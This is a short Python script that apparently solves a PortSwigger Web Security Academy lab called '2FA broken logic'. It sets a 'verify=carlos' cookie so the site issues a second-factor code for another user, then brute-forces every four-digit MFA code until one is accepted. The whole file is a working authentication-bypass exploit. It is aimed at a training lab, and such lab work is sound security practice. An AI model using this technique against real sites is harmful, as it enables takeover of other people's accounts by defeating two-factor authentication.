from listgen import *
import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: 2FA broken logic')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

headers = {"Cookie":"verify=carlos"}
r = requests.get("https://" + lab.id + ".web-security-academy.net/login2", headers=headers, allow_redirects=False)
carlos_session = r.cookies.get("session")
headers = {"Cookie":f"verify=carlos;session={carlos_session}"}

# GENERATE SECOND FACTOR TOKEN FOR CARLOS AND BRUTE-FORCE IT
for i in range(1,10000):
    r = requests.post("https://" + lab.id + f".web-security-academy.net/login2", headers=headers, data={"mfa-code":f"{i:04d}"})
    if "Incorrect" not in r.text:
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")